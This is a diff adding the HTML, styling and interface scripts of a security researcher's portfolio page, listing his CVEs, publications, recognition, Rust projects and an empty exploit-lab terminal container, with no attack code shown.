+#breach-overlay{position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:9999;display:none;flex-direction:column;align-items:center;justify-content:center;color:var(--danger);font-family:'JetBrains Mono',monospace;text-align:center;padding:20px}
+#breach-overlay.show{display:flex;animation:breach-flicker .1s infinite}
+@keyframes breach-flicker{0%{opacity:.8}50%{opacity:1}100%{opacity:.85}}
+#breach-overlay h1{font-size:clamp(2rem,8vw,5rem);text-shadow:0 0 20px var(--danger);margin-bottom:10px}
+#breach-overlay p{font-size:1.2rem;color:#fff;margin-bottom:30px}
+#breach-close{background:var(--danger);color:#000;border:none;padding:12px 24px;font-size:1rem;font-weight:700;border-radius:8px;cursor:pointer;font-family:inherit}
+</style>
+</head>
+<body>
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-MZ63S5LS" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+
+<div id="progress-bar"></div>
+
+<header class="nav">
+  <div class="container nav-inner">
+    <button class="brand" id="brandBtn">
+      <span class="dot"></span>
+      <span class="brand-name" data-text="Pavan" id="brandText">Pavan</span>
+      <span class="brand-cursor"></span>
+    </button>
+    <div class="nav-right">
+      <nav class="nav-links">
+        <a href="#cve-portfolio">CVEs</a>
+        <a href="#publications">Publications</a>
+        <a href="#recognition">Recognition</a>
+        <a href="#experience">Experience</a>
+        <a href="#contact">Contact</a>
+        <a href="https://github.com/pavanchow" target="_blank" rel="noopener">GitHub ↗</a>
+        <a href="https://www.linkedin.com/in/pavanchow/" target="_blank" rel="noopener">LinkedIn ↗</a>
+        <a href="https://orcid.org/0009-0009-1481-6629" target="_blank" rel="noopener" title="ORCID iD: 0009-0009-1481-6629" style="display:inline-flex;align-items:center;gap:5px">
+          <svg width="15" height="15" viewBox="0 0 256 256" aria-hidden="true" style="flex-shrink:0"><path fill="#A6CE39" d="M256 128c0 70.7-57.3 128-128 128S0 198.7 0 128 57.3 0 128 0s128 57.3 128 128z"/><path fill="#FFF" d="M86.3 186.2H70.9V79.1h15.4v107.1zM108.9 79.1h41.6c39.6 0 57 28.3 57 53.6 0 27.5-21.5 53.6-56.8 53.6h-41.8V79.1zm15.4 93.3h24.5c34.9 0 42.9-26.5 42.9-39.7 0-21.5-13.7-39.7-43.7-39.7h-23.7v79.4zM88.7 56.8c0 5.5-4.5 10.1-10.1 10.1s-10.1-4.6-10.1-10.1c0-5.6 4.5-10.1 10.1-10.1 5.6 0 10.1 4.6 10.1 10.1z"/></svg>ORCID ↗</a>
+      </nav>
+      <button class="theme-toggle" id="themeToggle" aria-label="Cycle theme">
+        <span class="ico" id="themeIco">☀</span><span class="label" id="themeLabel">light</span>
+      </button>
+      <button class="hamburger" id="hamburger" aria-label="Menu">☰</button>
+    </div>
+  </div>
+  <div class="nav-panel" id="navPanel">
+    <a href="#cve-portfolio">CVE Portfolio</a>
+    <a href="#lab">From the Lab</a>
+    <a href="#publications">Publications</a>
+    <a href="#recognition">Recognition</a>
+    <a href="#experience">Experience</a>
+    <a href="#education">Education &amp; Certs</a>
+    <a href="#community">Community</a>
+    <a href="#projects">Projects</a>
+    <a href="#contact">Contact</a>
+    <a href="https://github.com/pavanchow" target="_blank" rel="noopener">GitHub ↗</a>
+    <a href="https://www.linkedin.com/in/pavanchow/" target="_blank" rel="noopener">LinkedIn ↗</a>
+    <a href="https://orcid.org/0009-0009-1481-6629" target="_blank" rel="noopener" title="ORCID iD: 0009-0009-1481-6629" style="display:inline-flex;align-items:center;gap:6px">
+      <svg width="15" height="15" viewBox="0 0 256 256" aria-hidden="true" style="flex-shrink:0"><path fill="#A6CE39" d="M256 128c0 70.7-57.3 128-128 128S0 198.7 0 128 57.3 0 128 0s128 57.3 128 128z"/><path fill="#FFF" d="M86.3 186.2H70.9V79.1h15.4v107.1zM108.9 79.1h41.6c39.6 0 57 28.3 57 53.6 0 27.5-21.5 53.6-56.8 53.6h-41.8V79.1zm15.4 93.3h24.5c34.9 0 42.9-26.5 42.9-39.7 0-21.5-13.7-39.7-43.7-39.7h-23.7v79.4zM88.7 56.8c0 5.5-4.5 10.1-10.1 10.1s-10.1-4.6-10.1-10.1c0-5.6 4.5-10.1 10.1-10.1 5.6 0 10.1 4.6 10.1 10.1z"/></svg>ORCID iD ↗</a>
+  </div>
+</header>
+
+<main>
+<section class="hero">
+  <canvas id="matrix-canvas"></canvas>
+  <div class="container">
+    <div class="hero-grid">
+      <div class="hero-text">
+        <div class="hero-tag">// root@pavan ~ ./recon</div>
+        <h1>Pavan Nallamothu<br><span class="typewriter-line" id="typewriter"></span><span class="caret"></span></h1>
+        <p class="lead">Offensive security researcher. 12 published CVEs across Apple, CISA, NSA, AutoGPT, yt-dlp and BlueprintUE. I report vulnerabilities through HackerOne, Bugcrowd, Google VRP, Apple, and Meta, and hold an M.S. in Cybersecurity.</p>
+        <div class="hero-meta">
+          <span>📍 <strong>Jersey City, NJ</strong></span>
+          <span>🎓 <strong>M.S. Cybersecurity · Pace University</strong></span>
+          <span>🛡️ <strong>ISC² NJ Chapter · CTF Committee</strong></span>
+        </div>
+        <div class="hero-contact">
+          <a href="mailto:pavankumarpre@gmail.com">pavankumarpre@gmail.com</a>
+          <a href="tel:+15512295068">(551) 229-5068</a>
+        </div>
+      </div>
+      <div class="hero-photo">
+        <img src="img/pavan-hero.jpg" alt="Pavan Nallamothu, security researcher" width="240" height="240" fetchpriority="high" decoding="async" />
+      </div>
+    </div>
+    <div class="stats">
+      <div class="stat"><div class="n">12</div><div class="l">CVEs Published</div></div>
+      <div class="stat"><div class="n">3</div><div class="l">Apple · CISA · NSA</div></div>
+      <div class="stat"><div class="n">5</div><div class="l">Disclosure Platforms</div></div>
+      <div class="stat"><div class="n">4+</div><div class="l">Years Cloud/DevOps</div></div>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="cve-portfolio">
+  <div class="container">
+    <div class="section-head">
+      <div>
+        <h2 class="section-title">Published CVEs</h2>
+        <p class="section-sub">Twelve published CVEs across Apple, the NSA, CISA, AutoGPT, yt-dlp, and BlueprintUE, covering sandbox escapes, SSRF, authentication bypass, IDOR, path traversal, and denial of service.</p>
+        <p class="section-sub" style="margin-top:10px">Credited by CISA in advisory <a href="https://www.cisa.gov/news-events/ics-advisories/icsa-26-230-01" target="_blank" rel="noopener" style="color:var(--accent)">ICSA-26-230-01</a> for reporting CVE-2026-63133, CVE-2026-63134, and CVE-2026-63177 in CISA Malcolm, and by Apple in <a href="https://support.apple.com/en-us/128072" target="_blank" rel="noopener" style="color:var(--accent)">macOS security updates</a>.</p>
+      </div>
+    </div>
+    <div class="cve-viewport">
+      <div class="cve-track" id="cve-grid" aria-label="Published CVEs, continuously scrolling"></div>
+    </div>
+    <div class="cve-scroll-hint">// hover any card to pause the loop</div>
+  </div>
+</section>
+
+<section class="section" id="lab">
+  <div class="container">
+    <div class="section-head">
+      <div>
+        <h2 class="section-title">Exploit Lab</h2>
+        <p class="section-sub">Live reproduction scripts for disclosed bugs. Each visit loads a random proof of concept, and the tabs switch between them.</p>
+      </div>
+    </div>
+    <div class="lab-tabs" id="lab-tabs">
+      <button class="lab-tab" data-lab="5">Apple ATS Sandbox</button>
+      <button class="lab-tab" data-lab="6">NSA Priv-Esc</button>
+      <button class="lab-tab" data-lab="7">NSA IDOR</button>
+      <button class="lab-tab" data-lab="3">Malcolm Path Traversal</button>
+      <button class="lab-tab" data-lab="4">Malcolm RBAC Bypass</button>
+      <button class="lab-tab" data-lab="8">Malcolm inode DoS</button>
+      <button class="lab-tab" data-lab="0">AutoGPT SSRF</button>
+      <button class="lab-tab" data-lab="2">yt-dlp File Write</button>
+      <button class="lab-tab" data-lab="1">BlueprintUE Auth</button>
+    </div>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="tdot r"></span><span class="tdot y"></span><span class="tdot g"></span>
+        <span class="title" id="lab-title">pavan@lab: ~</span>
+      </div>
+      <div class="terminal-body" id="termBody"></div>
+      <div class="scanline"></div>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="publications">
+  <div class="container">
+    <div class="section-head">
+      <div>
+        <h2 class="section-title">Publications</h2>
+        <p class="section-sub">Open-access security research preprints with permanent DOIs, indexed by OpenAIRE.</p>
+      </div>
+    </div>
+    <div class="grid grid-3">
+      <article class="card">
+        <span class="card-tag">Preprint</span>
+        <h3>SSRF Beyond HTTP: Egress-Path-Incomplete Guards in AI Agent Platforms</h3>
+        <p>A formal egress-path-incomplete SSRF model instantiated on CVE-2026-33234 (AutoGPT). Zenodo, 2026.</p>
+        <div class="card-meta"><a href="papers/ssrf-beyond-http.html" style="color:var(--accent)">Paper &amp; PDF</a><a href="https://doi.org/10.5281/zenodo.22075470" target="_blank" rel="noopener" style="color:var(--accent)">doi &rarr;</a></div>
+      </article>
+      <article class="card">
+        <span class="card-tag">Preprint</span>
+        <h3>Trusting the Filename: File-Write Attacks from Untrusted Archive and Download Metadata</h3>
+        <p>File-write attacks from attacker-controlled archive and download metadata across three 2026 CVEs. Zenodo, 2026.</p>
+        <div class="card-meta"><a href="papers/trusting-the-filename.html" style="color:var(--accent)">Paper &amp; PDF</a><a href="https://doi.org/10.5281/zenodo.22075439" target="_blank" rel="noopener" style="color:var(--accent)">doi &rarr;</a><a href="https://doi.org/10.20944/preprints202608.2314.v1" target="_blank" rel="noopener" style="color:var(--accent)">preprints doi &rarr;</a></div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="recognition">
+  <div class="container">
+    <div class="section-head">
+      <div>
+        <h2 class="section-title">Recognition</h2>
+        <p class="section-sub">Independent databases, vendors, government agencies, security media, and community that track, credit, and feature this work. Every link verified against its source.</p>
+      </div>
+    </div>
+    <div class="rec-scroll">
+      <article class="card">
+        <span class="card-tag">Commercial scanner</span>
+        <h3>Snyk Vulnerability Database</h3>
+        <p>Credits Pavan Nallamothu for CVE-2026-50023 in yt-dlp. Surfaced automatically inside enterprise dependency scans worldwide.</p>
+        <div class="card-meta"><span style="display:inline-flex;align-items:center;gap:6px"><img src="img/logos/snyk.png" alt="" width="16" height="16" loading="lazy" style="border-radius:3px">Snyk</span><a href="https://security.snyk.io/vuln/SNYK-PYTHON-YTDLP-17353911" target="_blank" rel="noopener" style="color:var(--accent)">SNYK-PYTHON-YTDLP-17353911 &rarr;</a></div>
+      </article>
+      <article class="card">
+        <span class="card-tag">Government</span>
+        <h3>CISA ICS Advisory</h3>
+        <p>Credited in ICSA-26-230-01 for CVE-2026-63133, CVE-2026-63134, and CVE-2026-63177 in CISA Malcolm.</p>
+        <div class="card-meta"><span style="display:inline-flex;align-items:center;gap:6px"><img src="img/logos/cisa.png" alt="" width="16" height="16" loading="lazy" style="border-radius:3px">CISA</span><a href="https://www.cisa.gov/news-events/ics-advisories/icsa-26-230-01" target="_blank" rel="noopener" style="color:var(--accent)">ICSA-26-230-01 &rarr;</a></div>
+      </article>
+      <article class="card">
+        <span class="card-tag">Vendor</span>
+        <h3>Apple Security Updates</h3>
+        <p>Credited in Apple's macOS security release notes for CVE-2026-43763 in Apple Type Services.</p>
+        <div class="card-meta"><span style="display:inline-flex;align-items:center;gap:6px"><img src="img/logos/apple.png" alt="" width="16" height="16" loading="lazy" style="border-radius:3px">Apple</span><a href="https://support.apple.com/en-us/128072" target="_blank" rel="noopener" style="color:var(--accent)">Security notes &rarr;</a></div>
+      </article>
+      <article class="card">
+        <span class="card-tag">Dev ecosystem</span>
+        <h3>GitHub Security Advisories</h3>
+        <p>Credited reporter on the GitHub-reviewed advisory for the yt-dlp filename bug, GHSA-c6mh-fpjc-4pr3.</p>
+        <div class="card-meta"><span style="display:inline-flex;align-items:center;gap:6px"><img src="img/logos/github.png" alt="" width="16" height="16" loading="lazy" style="border-radius:3px">GHSA</span><a href="https://github.com/advisories/GHSA-c6mh-fpjc-4pr3" target="_blank" rel="noopener" style="color:var(--accent)">GHSA-c6mh-fpjc-4pr3 &rarr;</a></div>
+      </article>
+      <article class="card">
+        <span class="card-tag">Open database</span>
+        <h3>OSV.dev</h3>
+        <p>Google's open vulnerability database mirrors the credited advisories into automated supply-chain tooling.</p>
+        <div class="card-meta"><span style="display:inline-flex;align-items:center;gap:6px"><img src="img/logos/osv.png" alt="" width="16" height="16" loading="lazy" style="border-radius:3px">OSV</span><a href="https://osv.dev/vulnerability/GHSA-c6mh-fpjc-4pr3" target="_blank" rel="noopener" style="color:var(--accent)">GHSA-c6mh-fpjc-4pr3 &rarr;</a></div>
+      </article>
+      <article class="card">
+        <span class="card-tag">Disclosure list</span>
+        <h3>Full-Disclosure</h3>
+        <p>Apple's advisory APPLE-SA-07-27-2026-3 on the Full-Disclosure mailing list credits Pavan Nallamothu by name for CVE-2026-43763.</p>
+        <div class="card-meta"><span style="display:inline-flex;align-items:center;gap:6px"><img src="img/logos/fulldisclosure.png" alt="" width="16" height="16" loading="lazy" style="border-radius:3px">Full-Disclosure</span><a href="https://marc.info/?l=full-disclosure&amp;m=178604616253443" target="_blank" rel="noopener" style="color:var(--accent)">APPLE-SA-07-27-2026-3 &rarr;</a></div>
+      </article>
+      <article class="card">
+        <span class="card-tag">Security media</span>
+        <h3>OT Security Wire</h3>
+        <p>Independent coverage of CISA ICSA-26-230-01 that credits pavanchow among the researchers who reported the Malcolm findings.</p>
+        <div class="card-meta"><span style="display:inline-flex;align-items:center;gap:6px"><img src="img/logos/otsecuritywire.png" alt="" width="16" height="16" loading="lazy" style="border-radius:3px">OT Security Wire</span><a href="https://otsecuritywire.com/articles/cisa-malcolm-icsa-26-230-01-network-analysis-tool-vulnerabilities-2026" target="_blank" rel="noopener" style="color:var(--accent)">Read &rarr;</a></div>
+      </article>
+      <article class="card">
+        <span class="card-tag">Security media</span>
+        <h3>CyberICT</h3>
+        <p>Independent write-up naming pavanchow as the reporter of CVE-2026-63133, CVE-2026-63134, and CVE-2026-63177 to CISA.</p>
+        <div class="card-meta"><span style="display:inline-flex;align-items:center;gap:6px"><img src="img/logos/cyberict.png" alt="" width="16" height="16" loading="lazy" style="border-radius:3px">CyberICT</span><a href="https://www.cyberict.com/article/cisa-icsa-26-230-01" target="_blank" rel="noopener" style="color:var(--accent)">Read &rarr;</a></div>
+      </article>
+      <article class="card">
+        <span class="card-tag">Independent</span>
+        <h3>Assurant Cyber</h3>
+        <p>First non-government site to credit pavanchow for the CISA Malcolm advisory ICSA-26-230-01.</p>
+        <div class="card-meta"><span style="display:inline-flex;align-items:center;gap:6px"><img src="img/logos/assurantcyber.png" alt="" width="16" height="16" loading="lazy" style="border-radius:3px">Assurant Cyber</span><a href="https://www.assurantcyber.com/blog/icsa-26-230-01/" target="_blank" rel="noopener" style="color:var(--accent)">Read &rarr;</a></div>
+      </article>
+      <article class="card">
+        <span class="card-tag">Speaking</span>
+        <h3>ISC2 NJ Chapter</h3>
+        <p>Featured as a SECON NJ 2024 organizer and speaker on Zero Trust, with a full-name researcher bio in the chapter newsletter.</p>
+        <div class="card-meta"><span style="display:inline-flex;align-items:center;gap:6px"><img src="img/logos/isc2.png" alt="" width="16" height="16" loading="lazy" style="border-radius:3px">ISC2 NJ</span><a href="https://isc2njchapter.curated.co/issues/46" target="_blank" rel="noopener" style="color:var(--accent)">Newsletter &rarr;</a></div>
+      </article>
+    </div>
+    <div class="rec-jog"><div class="rec-jog-track"></div><button class="rec-jog-knob" type="button" aria-label="Drag left or right to scroll the recognition cards"><i></i><i></i><i></i></button></div>
+  </div>
+</section>
+
+<section class="section" id="experience">
+  <div class="container">
+    <div class="section-head">
+      <div>
+        <h2 class="section-title">Experience</h2>
+        <p class="section-sub">Running AWS infrastructure at scale, building and hosting CTF challenges, and supporting a university campus.</p>
+      </div>
+    </div>
+    <div class="grid" id="exp-grid"></div>
+  </div>
+</section>
+
+<section class="section" id="education">
+  <div class="container">
+    <div class="section-head">
+      <div>
+        <h2 class="section-title">Education &amp; Credentials</h2>
+        <p class="section-sub">Master of Science in Cybersecurity from Pace University, awarded a Graduate Merit Scholarship.</p>
+      </div>
+    </div>
+    <div class="card" style="margin-bottom:24px">
+      <span class="card-tag">Education</span>
+      <h3>M.S. Cybersecurity</h3>
+      <p>Pace University, New York, NY · 2023 - 2025 · Graduate Merit Scholarship</p>
+    </div>
+    <h3 style="font-size:1rem;margin-bottom:14px;color:var(--text)">Certifications</h3>
+    <div class="cert-grid" id="cert-grid"></div>
+  </div>
+</section>
+
+<section class="section" id="community">
+  <div class="container">
+    <div class="section-head">
+      <div>
+        <h2 class="section-title">Community</h2>
+        <p class="section-sub">Talks, mentoring, competition, and event organizing across the security and open-source communities.</p>
+      </div>
+    </div>
+    <div class="community-list" id="community-grid"></div>
+  </div>
+</section>
+
+<section class="section" id="projects">
+  <div class="container">
+    <div class="section-head">
+      <div>
+        <h2 class="section-title">Open-Source Builds</h2>
+        <p class="section-sub">Seventeen systems tools written from scratch in Rust, each its own repository with a live project page. Build-your-own versions of the software I break for a living, from a static analyzer to a version-control core.</p>
+      </div>
+    </div>
+    <div class="rec-scroll" data-marquee>
+      <article class="card">
+        <span class="card-tag">Security</span>
+        <h3>Oracle</h3>
+        <p>A query language whose result is an attack path across identity and network graphs, not rows. Aimed at AWS IAM privilege escalation and lateral movement.</p>
+        <div class="card-meta"><a href="https://github.com/pavanchow/oracle" target="_blank" rel="noopener" style="color:var(--accent)">Repo →</a><a href="https://pavanchow.github.io/oracle/" target="_blank" rel="noopener" style="color:var(--accent)">Live →</a></div>
+      </article>
+      <article class="card">
+        <span class="card-tag">Security</span>
+        <h3>Lint-Owl</h3>
+        <p>A static analyzer for Python, JavaScript, and PHP that returns the data-flow path from source to sink, not just a warning.</p>
+        <div class="card-meta"><a href="https://github.com/pavanchow/lint-owl" target="_blank" rel="noopener" style="color:var(--accent)">Repo →</a><a href="https://pavanchow.github.io/lint-owl/" target="_blank" rel="noopener" style="color:var(--accent)">Live →</a></div>
+      </article>
+      <article class="card">
+        <span class="card-tag">Security</span>
+        <h3>Unweave</h3>
+        <p>An EVM bytecode disassembler that reconstructs intent and flags dangerous opcodes, not just mnemonics.</p>
+        <div class="card-meta"><a href="https://github.com/pavanchow/unweave" target="_blank" rel="noopener" style="color:var(--accent)">Repo →</a><a href="https://pavanchow.github.io/unweave/" target="_blank" rel="noopener" style="color:var(--accent)">Live →</a></div>
+      </article>
+      <article class="card">
+        <span class="card-tag">Security</span>
+        <h3>Cipherlock</h3>
+        <p>An encryption toolkit with from-scratch ChaCha20-Poly1305 AEAD, proven against the RFC 8439 test vectors.</p>
+        <div class="card-meta"><a href="https://github.com/pavanchow/cipherlock" target="_blank" rel="noopener" style="color:var(--accent)">Repo →</a><a href="https://pavanchow.github.io/cipherlock/" target="_blank" rel="noopener" style="color:var(--accent)">Live →</a></div>
+      </article>
+      <article class="card">
+        <span class="card-tag">Systems</span>
+        <h3>Flint</h3>
+        <p>An embedded key-value store, the SQLite of KV stores. A single binary and a directory, no server to run.</p>
+        <div class="card-meta"><a href="https://github.com/pavanchow/flint" target="_blank" rel="noopener" style="color:var(--accent)">Repo →</a><a href="https://pavanchow.github.io/flint/" target="_blank" rel="noopener" style="color:var(--accent)">Live →</a></div>
+      </article>
+      <article class="card">
+        <span class="card-tag">Systems</span>
+        <h3>Rift</h3>
+        <p>A reverse proxy whose routing rules are a compiled DSL, not YAML.</p>
+        <div class="card-meta"><a href="https://github.com/pavanchow/rift" target="_blank" rel="noopener" style="color:var(--accent)">Repo →</a><a href="https://pavanchow.github.io/rift/" target="_blank" rel="noopener" style="color:var(--accent)">Live →</a></div>
+      </article>
+      <article class="card">
+        <span class="card-tag">Systems</span>
+        <h3>Metronome</h3>
+        <p>A cron scheduler built as a single binary around a pure, unit-tested schedule engine you can embed.</p>
+        <div class="card-meta"><a href="https://github.com/pavanchow/metronome" target="_blank" rel="noopener" style="color:var(--accent)">Repo →</a><a href="https://pavanchow.github.io/metronome/" target="_blank" rel="noopener" style="color:var(--accent)">Live →</a></div>
+      </article>
+      <article class="card">
+        <span class="card-tag">Systems</span>
+        <h3>Honeycomb</h3>
+        <p>A readable global memory allocator that reports bytes-in-use and peak live memory.</p>
+        <div class="card-meta"><a href="https://github.com/pavanchow/honeycomb" target="_blank" rel="noopener" style="color:var(--accent)">Repo →</a><a href="https://pavanchow.github.io/honeycomb/" target="_blank" rel="noopener" style="color:var(--accent)">Live →</a></div>
+      </article>
+      <article class="card">
+        <span class="card-tag">Systems</span>
+        <h3>Semaphore</h3>
+        <p>A length-prefixed binary wire protocol you can read in one sitting.</p>
+        <div class="card-meta"><a href="https://github.com/pavanchow/semaphore" target="_blank" rel="noopener" style="color:var(--accent)">Repo →</a><a href="https://pavanchow.github.io/semaphore/" target="_blank" rel="noopener" style="color:var(--accent)">Live →</a></div>
+      </article>
+      <article class="card">
+        <span class="card-tag">Systems</span>
+        <h3>Timelace</h3>
+        <p>A version-control core with content-addressed blob, tree, and commit objects. The git idea made readable.</p>
+        <div class="card-meta"><a href="https://github.com/pavanchow/timelace" target="_blank" rel="noopener" style="color:var(--accent)">Repo →</a><a href="https://pavanchow.github.io/timelace/" target="_blank" rel="noopener" style="color:var(--accent)">Live →</a></div>
+      </article>
+      <article class="card">
+        <span class="card-tag">Systems</span>
+        <h3>Trailhead</h3>
+        <p>A full-text search engine with an inverted index and TF-IDF ranking, readable end to end.</p>
+        <div class="card-meta"><a href="https://github.com/pavanchow/trailhead" target="_blank" rel="noopener" style="color:var(--accent)">Repo →</a><a href="https://pavanchow.github.io/trailhead/" target="_blank" rel="noopener" style="color:var(--accent)">Live →</a></div>
+      </article>
+      <article class="card">
+        <span class="card-tag">Runtimes</span>
+        <h3>Mirage</h3>
+        <p>A panic-free stack bytecode VM with its own assembler and bytecode format.</p>
+        <div class="card-meta"><a href="https://github.com/pavanchow/mirage" target="_blank" rel="noopener" style="color:var(--accent)">Repo →</a><a href="https://pavanchow.github.io/mirage/" target="_blank" rel="noopener" style="color:var(--accent)">Live →</a></div>
+      </article>
+      <article class="card">
+        <span class="card-tag">Runtimes</span>
+        <h3>Phantom</h3>
+        <p>A CHIP-8 CPU emulator you can unit-test opcode by opcode.</p>
+        <div class="card-meta"><a href="https://github.com/pavanchow/phantom" target="_blank" rel="noopener" style="color:var(--accent)">Repo →</a><a href="https://pavanchow.github.io/phantom/" target="_blank" rel="noopener" style="color:var(--accent)">Live →</a></div>
+      </article>
+      <article class="card">
+        <span class="card-tag">Languages</span>
+        <h3>Sprite</h3>
+        <p>A tiny embeddable scripting language and interpreter you can read in a sitting.</p>
+        <div class="card-meta"><a href="https://github.com/pavanchow/sprite" target="_blank" rel="noopener" style="color:var(--accent)">Repo →</a><a href="https://pavanchow.github.io/sprite/" target="_blank" rel="noopener" style="color:var(--accent)">Live →</a></div>
+      </article>
+      <article class="card">
+        <span class="card-tag">Graphics</span>
+        <h3>Prism</h3>
+        <p>A software rasterizer that draws real 3D triangles on the CPU with a z-buffer, no GPU.</p>
+        <div class="card-meta"><a href="https://github.com/pavanchow/prism" target="_blank" rel="noopener" style="color:var(--accent)">Repo →</a><a href="https://pavanchow.github.io/prism/" target="_blank" rel="noopener" style="color:var(--accent)">Live →</a></div>
+      </article>
+      <article class="card">
+        <span class="card-tag">Machine learning</span>
+        <h3>Synapse</h3>
+        <p>A reverse-mode autograd engine you can follow node by node. Trains a network on XOR.</p>
+        <div class="card-meta"><a href="https://github.com/pavanchow/synapse" target="_blank" rel="noopener" style="color:var(--accent)">Repo →</a><a href="https://pavanchow.github.io/synapse/" target="_blank" rel="noopener" style="color:var(--accent)">Live →</a></div>
+      </article>
+      <article class="card">
+        <span class="card-tag">Audio</span>
+        <h3>Reverb</h3>
+        <p>An audio synthesis engine with oscillators, an ADSR envelope, and a hand-written WAV writer.</p>
+        <div class="card-meta"><a href="https://github.com/pavanchow/reverb" target="_blank" rel="noopener" style="color:var(--accent)">Repo →</a><a href="https://pavanchow.github.io/reverb/" target="_blank" rel="noopener" style="color:var(--accent)">Live →</a></div>
+      </article>
+    </div>
+    <div class="rec-jog"><div class="rec-jog-track"></div><button class="rec-jog-knob" type="button" aria-label="Drag left or right to scroll the projects"><i></i><i></i><i></i></button></div>
+    <h3 style="font-size:1rem;margin:28px 0 14px;color:var(--text)">More from the site</h3>
+    <div class="lab-tabs">
+      <a class="lab-tab" href="/blog/" style="text-decoration:none">Blog</a>
+      <a class="lab-tab" href="/ai/" style="text-decoration:none">AI Experiments</a>
+      <a class="lab-tab" href="/game/" style="text-decoration:none">Games</a>
+      <a class="lab-tab" href="/book/" style="text-decoration:none">Book</a>
+      <a class="lab-tab" href="/diy/" style="text-decoration:none">DIY</a>
+      <a class="lab-tab" href="/web/" style="text-decoration:none">Web</a>
+      <a class="lab-tab" href="/how-to.html" style="text-decoration:none">How-To</a>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="cli">
+  <div class="container">
+    <div class="section-head">
+      <div>
+        <h2 class="section-title">Shell</h2>
+        <p class="section-sub">Type <code class="mono">help</code> to see all commands. Try <code class="mono">neofetch</code>, <code class="mono">cves</code>, <code class="mono">experience</code>, or <code class="mono">scan github.com</code>.</p>
+      </div>
+    </div>
+    <div class="cli-terminal">
+      <div class="terminal-bar">
+        <span class="tdot r"></span><span class="tdot y"></span><span class="tdot g"></span>
+        <span class="title">guest@pavan-blog: ~</span>
+      </div>
+      <div class="cli-body" id="cli-body">
+        <div id="cli-output"></div>
+        <div class="cli-input-line">
+          <span class="cli-prompt" id="cli-prompt-text">guest@pavan-blog:~$</span>
+          <input type="text" class="cli-input" id="cli-input" autocomplete="off" spellcheck="false" aria-label="Terminal command input">
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="contact">
+  <div class="container">
+    <div class="section-head">
+      <div>
+        <h2 class="section-title">Get in Touch</h2>
+        <p class="section-sub">Reach out for collaboration, coordinated disclosure, or a conversation about offensive security.</p>
+      </div>
+    </div>
+    <div class="card revealed" style="cursor:default">
+      <span class="card-tag">Get in touch</span>
+      <p style="color:var(--text-muted)">Have a question or want to work together? Reach out directly.</p>
+      <p style="color:var(--text-muted);margin-top:6px">Connect with <a href="https://www.linkedin.com/in/pavanchow/" target="_blank" rel="noopener" title="Pavan Nallamothu on LinkedIn">Pavan Nallamothu on LinkedIn</a>.</p>
+      <div class="hero-contact" style="margin-top:18px">
+        <a href="mailto:pavankumarpre@gmail.com">pavankumarpre@gmail.com</a>
+        <a href="tel:+15512295068">(551) 229-5068</a>
+        <a href="https://www.linkedin.com/in/pavanchow/" target="_blank" rel="noopener">LinkedIn ↗</a>
+        <a href="https://github.com/pavanchow" target="_blank" rel="noopener">GitHub ↗</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="container">
+    <span>© <span id="year"></span> Pavan Nallamothu, Security Researcher · Penetration Tester</span>
+    <span>
+      <a href="mailto:pavankumarpre@gmail.com">Email</a> ·
+      <a href="https://github.com/pavanchow" target="_blank" rel="noopener">GitHub</a> ·
+      <a href="https://www.linkedin.com/in/pavanchow/" target="_blank" rel="noopener">LinkedIn</a> ·
+      <a href="https://pavanchow.gitlab.io/" rel="me">Researcher profile</a>
+    </span>
+  </div>
+</footer>
+
+<div class="toast" id="toast">Copied</div>
+
+<div id="breach-overlay">
+  <h1>SYSTEM BREACH DETECTED</h1>
+  <p>Just kidding. But you did type the Konami Code!</p>
+  <button id="breach-close">ACKNOWLEDGE &amp; RESTORE</button>
+</div>
+
+<script>
+/* ====== THEME ====== */
+var THEMES = ['light','dark','hacker'];
+var ICO = {dark:'◐',light:'☀',hacker:'◆'};
+
+function setTheme(t) {
+  if (THEMES.indexOf(t) === -1) t = 'light';
+  document.documentElement.setAttribute('data-theme', t);
+  document.getElementById('themeIco').textContent = ICO[t];
+  document.getElementById('themeLabel').textContent = t;
+  try { localStorage.setItem('pavan-theme', t); } catch(e) {}
+  var p = document.getElementById('cli-prompt-text');
+  if (p) p.textContent = (t === 'hacker' ? 'root' : 'guest') + '@pavan-blog:~$';
+}
+
+function cycleTheme() {
+  var cur = document.documentElement.getAttribute('data-theme') || 'light';
+  var idx = THEMES.indexOf(cur);
+  setTheme(THEMES[(idx + 1) % THEMES.length]);
+}
+
+(function initTheme() {
+  var t = 'light';
+  try { t = localStorage.getItem('pavan-theme') || t; } catch(e) {}
+  setTheme(t);
+  document.getElementById('themeToggle').addEventListener('click', cycleTheme);
+})();
+
+/* ====== MOBILE MENU ====== */
+document.getElementById('hamburger').addEventListener('click', function() {
+  var panel = document.getElementById('navPanel');
+  var isOpen = panel.classList.toggle('open');
+  this.setAttribute('aria-expanded', isOpen);
+  this.textContent = isOpen ? '✕' : '☰';
+});
+document.querySelectorAll('#navPanel a').forEach(function(a) {
+  a.addEventListener('click', function() {
+    document.getElementById('navPanel').classList.remove('open');
+    document.getElementById('hamburger').textContent = '☰';
+  });
+});
+
+/* ====== BRAND SCRAMBLE ====== */
+var chars = '!<>-_\\/[]{}-=+*^?#________01ABCDEF';
+function scrambleText(el, finalText) {
+  var i = 0;
+  clearInterval(el.scrambleInt);
+  el.scrambleInt = setInterval(function() {
+    el.textContent = finalText.split('').map(function(letter, idx) {
+      if (idx < i) return finalText[idx];
+      return chars[Math.floor(Math.random() * chars.length)];
+    }).join('');
+    if (i >= finalText.length) clearInterval(el.scrambleInt);
+    i += 0.5;
+  }, 40);
+}
+var brandText = document.getElementById('brandText');
+scrambleText(brandText, 'Pavan');
+document.getElementById('brandBtn').addEventListener('click', function() {
+  scrambleText(brandText, 'Pavan');
+});
+
+/* ====== PROGRESS BAR ====== */
+function updateProgress() {
+  var h = document.documentElement;
+  var pct = (h.scrollTop / (h.scrollHeight - h.clientHeight || 1)) * 100;
+  document.getElementById('progress-bar').style.width = pct + '%';
+}
+document.addEventListener('scroll', updateProgress, {passive:true});
